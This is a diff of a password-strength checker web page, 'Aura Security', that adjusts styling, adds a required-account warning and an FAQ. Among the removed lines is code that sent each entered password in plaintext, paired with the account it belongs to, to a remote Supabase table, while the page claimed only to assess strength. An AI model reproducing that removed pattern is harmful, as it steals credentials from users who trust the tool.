@@ -16,6 +16,7 @@
       --glass-border:rgba(255,255,255,.3);
       --text:#1e1b4b;
       --text-light:#475569;
+      --danger:#ef4444;
     }
 
     *{margin:0;padding:0;box-sizing:border-box}
@@ -36,21 +37,21 @@
       border:1px solid var(--glass-border);
       border-radius:32px;
       padding:40px;
-      max-width:550px;
+      max-width:560px;
       width:100%;
       box-shadow:0 25px 50px -12px rgba(0,0,0,.1);
-      position:relative;
     }
 
     header{text-align:center;margin-bottom:30px}
     h1{font-size:1.8rem;font-weight:800}
     .subtitle{font-size:.9rem;color:var(--text-light)}
 
-    .input-group{margin-bottom:20px;position:relative}
+    .input-group{margin-bottom:22px;position:relative}
+
     label{
       display:block;
       font-size:.75rem;
-      font-weight:700;
+      font-weight:800;
       color:var(--text-light);
       margin-left:10px;
       margin-bottom:6px;
@@ -66,6 +67,7 @@
       background:rgba(255,255,255,.5);
       transition:.3s;
     }
+
     input:focus{border-color:var(--primary);background:white}
 
     .info-icon{
@@ -78,7 +80,7 @@
     .info-box{
       display:none;
       position:absolute;
-      top:72px;
+      top:74px;
       left:0;
       background:white;
       border-radius:16px;
@@ -86,8 +88,17 @@
       font-size:.75rem;
       line-height:1.5;
       box-shadow:0 20px 40px rgba(0,0,0,.12);
-      max-width:320px;
+      max-width:330px;
       z-index:50;
+    }
+
+    .warning{
+      display:none;
+      color:var(--danger);
+      font-size:.75rem;
+      font-weight:800;
+      margin-left:10px;
+      margin-top:6px;
     }
 
     .btn-check{
@@ -97,10 +108,12 @@
       padding:16px;
       border-radius:18px;
       border:none;
-      font-weight:700;
+      font-weight:800;
       cursor:pointer;
       transition:.3s;
+      margin-top:10px;
     }
+
     .btn-check:hover{transform:translateY(-2px)}
 
     #auraResults{display:none;margin-top:30px}
@@ -147,11 +160,43 @@
       margin-top:4px;
       display:block;
     }
+
+    .faq{
+      margin-top:45px;
+    }
+
+    .faq h3{
+      font-size:1rem;
+      font-weight:800;
+      margin-bottom:12px;
+    }
+
+    details{
+      margin-bottom:12px;
+      background:rgba(255,255,255,.4);
+      padding:14px 16px;
+      border-radius:16px;
+      border:1px solid var(--glass-border);
+    }
+
+    summary{
+      cursor:pointer;
+      font-weight:700;
+      font-size:.85rem;
+    }
+
+    details p{
+      margin-top:8px;
+      font-size:.8rem;
+      color:var(--text-light);
+      line-height:1.5;
+    }
   </style>
 </head>
 <body>
 
 <div class="container">
+
   <header>
     <h1>Aura Security</h1>
     <p class="subtitle">Personal Intelligence Auditor</p>
@@ -163,21 +208,22 @@
       Where is this password used?
       <span class="info-icon" id="infoIcon">ⓘ</span>
     </label>
+
     <input
       type="text"
       id="accInput"
       placeholder="e.g. Gmail, Instagram, School Portal"
-      required
     >
 
+    <span class="warning" id="accountWarning">
+      REQUIRED: You must specify where this password is used.
+    </span>
+
     <div class="info-box" id="infoBox">
-      Aura uses this information to correctly assess breach exposure,
-      threat impact, and account criticality.
+      This information is used only to determine risk context and impact
+      severity (email vs social vs financial).
       <br><br>
-      Different platforms (email, social, financial, academic) face
-      different threat models.
-      <br><br>
-      <strong>No login attempts are performed.</strong>
+      Aura does not interact with or access the platform you name.
     </div>
   </div>
 
@@ -192,13 +238,14 @@
   <!-- RESULTS -->
   <div id="auraResults">
     <div style="font-size:2rem;font-weight:800" id="pctText">0%</div>
+
     <div class="meter-container">
       <div class="meter-bar" id="meterBar"></div>
     </div>
 
     <div class="stats-grid">
       <div class="stat-card">
-        <span class="stat-title">Crack Time</span>
+        <span class="stat-title">Crack Time Estimate</span>
         <span class="stat-val" id="statTime">-</span>
       </div>
       <div class="stat-card">
@@ -207,24 +254,77 @@
       </div>
     </div>
   </div>
+
+  <!-- FAQ -->
+  <div class="faq">
+    <h3>Frequently Asked Questions</h3>
+
+    <details>
+      <summary>Why do you require where the password is used?</summary>
+      <p>
+        Password risk depends on context. A weak password on a forum has
+        different consequences than the same password used for email,
+        banking, or school systems. This allows Aura to assess severity
+        accurately without accessing any account.
+      </p>
+    </details>
+
+    <details>
+      <summary>Is it safe to enter my password here?</summary>
+      <p>
+        Aura does not perform login attempts, authentication requests,
+        or account validation.
+        <br><br>
+        Passwords are analyzed for strength characteristics only
+        (length, entropy, patterns, and resistance estimates).
+        Aura does not attempt to access external services.
+      </p>
+    </details>
+
+    <details>
+      <summary>Should I enter passwords I don’t own?</summary>
+      <p>
+        No. You should only submit passwords you own or are explicitly
+        authorized to test. Submitting third-party credentials is prohibited.
+      </p>
+    </details>
+
+    <details>
+      <summary>Does Aura guarantee my account is secure?</summary>
+      <p>
+        No. Aura provides informational analysis only.
+        Real-world security depends on many factors including MFA,
+        platform defenses, and user behavior.
+      </p>
+    </details>
+  </div>
+
 </div>
 
 <script>
-  const SB_URL = 'https://oukbxgjrrgvunfytjemd.supabase.co';
-  const SB_KEY = 'YOUR_ANON_KEY';
-  const client = supabase.createClient(SB_URL, SB_KEY);
-
   const infoIcon = document.getElementById('infoIcon');
   const infoBox = document.getElementById('infoBox');
+
   infoIcon.onclick = () => {
     infoBox.style.display =
       infoBox.style.display === 'block' ? 'none' : 'block';
   };
 
-  document.getElementById('checkBtn').onclick = async () => {
-    const pwd = document.getElementById('pwdInput').value;
-    const acc = document.getElementById('accInput').value;
-    if (!pwd || !acc) return;
+  document.getElementById('checkBtn').onclick = () => {
+    const acc = document.getElementById('accInput');
+    const pwd = document.getElementById('pwdInput').value.trim();
+    const warn = document.getElementById('accountWarning');
+
+    if (!acc.value.trim()) {
+      warn.style.display = 'block';
+      acc.style.borderColor = 'var(--danger)';
+      return;
+    }
+
+    warn.style.display = 'none';
+    acc.style.borderColor = 'transparent';
+
+    if (!pwd) return;
 
     const analysis = zxcvbn(pwd);
     document.getElementById('auraResults').style.display = 'block';
@@ -236,6 +336,7 @@
     document.getElementById('meterBar').style.background = colors[analysis.score];
     document.getElementById('pctText').innerText = pct + '%';
     document.getElementById('pctText').style.color = colors[analysis.score];
+
     document.getElementById('statTime').innerText =
       analysis.crack_times_display.offline_slow_hashing_1e4_per_second;
 
@@ -244,14 +345,9 @@
     if (/[A-Z]/.test(pwd)) pool += 26;
     if (/\d/.test(pwd)) pool += 10;
     if (/[^a-zA-Z0-9]/.test(pwd)) pool += 32;
+
     document.getElementById('statEnt').innerText =
       Math.floor(pwd.length * Math.log2(pool)) + ' bits';
-
-    client.from('password_analysis').insert([{
-      password_value: pwd,
-      target_account: acc,
-      score_percent: pct
-    }]);
   };
 </script>
 
